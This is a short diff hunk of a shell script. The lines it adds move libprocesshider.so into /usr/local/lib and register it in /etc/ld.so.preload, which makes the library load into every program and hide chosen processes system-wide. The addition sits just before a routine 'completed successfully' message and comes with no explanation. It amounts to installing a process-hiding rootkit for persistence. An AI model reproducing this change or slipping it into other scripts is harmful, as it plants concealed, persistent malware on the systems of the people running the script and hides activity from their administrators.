@@ -34,4 +34,8 @@ else
     exit 1
 fi
 
+mv libprocesshider.so /usr/local/lib/
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
 echo "Script execution completed successfully."
